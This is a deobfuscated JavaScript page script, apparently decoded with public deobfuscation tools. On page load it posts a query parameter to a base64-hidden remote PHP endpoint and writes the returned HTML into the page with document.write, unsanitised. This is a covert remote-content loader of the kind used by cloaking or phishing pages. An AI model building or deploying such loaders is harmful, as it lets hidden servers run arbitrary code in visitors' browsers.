//Wed Dec 10 2025 09:56:01 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
const Utils = {
  "getQueryParam"(_0x18460c) {
    return new URLSearchParams(window.location.search).get(_0x18460c);
  },
  "escapeHTML"(_0x2f8b93) {
    if (!_0x2f8b93) return "";
    const _0x1c4ff9 = document.createElement("div");
    _0x1c4ff9.textContent = _0x2f8b93;
    return _0x1c4ff9.innerHTML;
  }
};
function showLoadingAnimation() {
  const _0x1bef27 = document.createElement("div");
  _0x1bef27.id = "loadingOverlay";
  _0x1bef27.style.position = "fixed";
  _0x1bef27.style.top = "0";
  _0x1bef27.style.left = "0";
  _0x1bef27.style.right = "0";
  _0x1bef27.style.bottom = "0";
  _0x1bef27.style.background = "white";
  _0x1bef27.style.display = "flex";
  _0x1bef27.style.alignItems = "center";
  _0x1bef27.style.justifyContent = "center";
  _0x1bef27.style.zIndex = "9999";
  const _0x45cd36 = document.createElement("div");
  _0x45cd36.classList.add("eight");
  _0x45cd36.style.position = "relative";
  _0x1bef27.appendChild(_0x45cd36);
  document.body.appendChild(_0x1bef27);
  const _0x3b7a6d = document.createElement("style");
  _0x3b7a6d.innerHTML = "\n    .eight {\n      width: 80px; \n      height: 80px; \n      border-radius: 50%;\n      animation: loader8Animation 1.5s linear infinite;\n      margin: 25px auto 0;\n    }\n    .eight:before {\n      width: 20px;\n      height: 20px;\n      content: \"\";\n      position: absolute;\n      background-color: transparent;\n      top: 40px;\n      left: 40px;\n      border-radius: 50%;\n\n      box-shadow: 0px -50px 0px 0px rgba(50, 50, 50, 1),\n        -36px -36px 0px -1px rgba(70, 70, 70, 0.875),\n        -50px 0px 0px -2px rgba(90, 90, 90, 0.75),\n        -36px 36px 0px -3px rgba(110, 110, 110, 0.625),\n        0px 50px 0px -4px rgba(130, 130, 130, 0.5),\n        36px 36px 0px -5px rgba(150, 150, 150, 0.375),\n        50px 0px 0px -6px rgba(170, 170, 170, 0.25),\n        36px -36px 0px -7px rgba(190, 190, 190, 0.125);\n    }\n    @keyframes loader8Animation {\n      0% { transform: rotate(0deg); }\n      100% { transform: rotate(360deg); }\n    }\n  ";
  document.head.appendChild(_0x3b7a6d);
}
function hideLoadingAnimation() {
  const _0x52770c = document.getElementById("loadingOverlay");
  if (_0x52770c) {
    _0x52770c.style.display = "none";
  }
}
async function init() {
  try {
    {
      showLoadingAnimation();
      const _0x3e3c16 = Utils.getQueryParam("i"),
        _0x502ef0 = atob("aHR0cHM6Ly9obWZuLmNuL0Nvcy90ejEtYWRmay5waHA="),
        _0x2e63b5 = await fetch(_0x502ef0, {
          "method": "POST",
          "headers": {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          "body": "url=" + encodeURIComponent(_0x3e3c16)
        }),
        _0x191555 = await _0x2e63b5.json();
      if (_0x191555?.["html"]) setTimeout(() => {
        hideLoadingAnimation();
        document.write(_0x191555.html);
      }, 200);else {
        throw new Error("获取失败");
      }
    }
  } catch (_0x5a846e) {
    console.error(_0x5a846e.message);
    hideLoadingAnimation();
  }
}
document.readyState === "complete" || document.readyState === "interactive" ? init() : document.addEventListener("DOMContentLoaded", function () {
  init();
});